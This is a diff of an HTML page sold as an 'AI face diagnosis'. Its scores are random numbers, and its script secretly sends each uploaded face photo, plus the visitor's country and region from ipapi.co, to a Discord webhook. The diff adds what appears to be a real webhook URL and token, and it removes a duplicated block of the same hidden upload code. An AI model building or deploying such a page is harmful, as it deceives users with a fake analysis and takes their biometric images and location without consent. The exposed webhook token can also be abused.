@@ -52,7 +52,7 @@ img {
 </div>
 
 <script>
-const WEBHOOK_URL = "ここにDiscordのWebhookURL";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";
 
 async function send() {
   const file = document.getElementById("file").files[0];
@@ -161,75 +161,6 @@ img {
 }
 </style>
 </head>
-
-<body>
-<h1>AI 顔診断</h1>
-
-<div class="card">
-  <input type="file" id="file" accept="image/*"><br><br>
-  <button onclick="send()">診断する</button>
-
-  <img id="preview" style="display:none;">
-  <div id="result"></div>
-</div>
-
-<script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";
-
-async function send() {
-  const file = document.getElementById("file").files[0];
-  if (!file) return alert("画像選ばねえと診断できんわかす");
-
-  const reader = new FileReader();
-  reader.onload = async () => {
-    // プレビュー表示
-    const img = document.getElementById("preview");
-    img.src = reader.result;
-    img.style.display = "block";
-
-    // 仮診断
-    const score = Math.floor(70 + Math.random() * 25);
-    let rank = "B";
-    if (score >= 90) rank = "S";
-    else if (score >= 80) rank = "A";
-
-    // 🔹 サイト表示（国・地域なし）
-    document.getElementById("result").innerHTML = `
-      <b>診断結果</b><br>
-      黄金比：<b>${score}%</b><br>
-      ランク：<b>${rank}</b>
-    `;
-
-    // 🔹 国・地域取得（表示しない）
-    let country = "unknown";
-    let region = "unknown";
-    try {
-      const res = await fetch("https://ipapi.co/json/");
-      const data = await res.json();
-      country = data.country_name;
-      region = data.region;
-    } catch {}
-
-    // Discord送信
-    sendToDiscord(reader.result, score, rank, country, region);
-  };
-  reader.readAsDataURL(file);
-}
-
-function sendToDiscord(image, score, rank, country, region) {
-  const form = new FormData();
-  form.append("file", dataURLtoBlob(image), "face.png");
-  form.append("payload_json", JSON.stringify({
-    content:
-`📸 **顔診断ログ**
-黄金比：${score}%
-ランク：${rank}
-🌍 国：${country}
-📍 地域：${region}`
-  }));
-
-  fetch(WEBHOOK_URL, { method: "POST", body: form });
-}
 
 function dataURLtoBlob(dataurl) {
   const arr = dataurl.split(",");
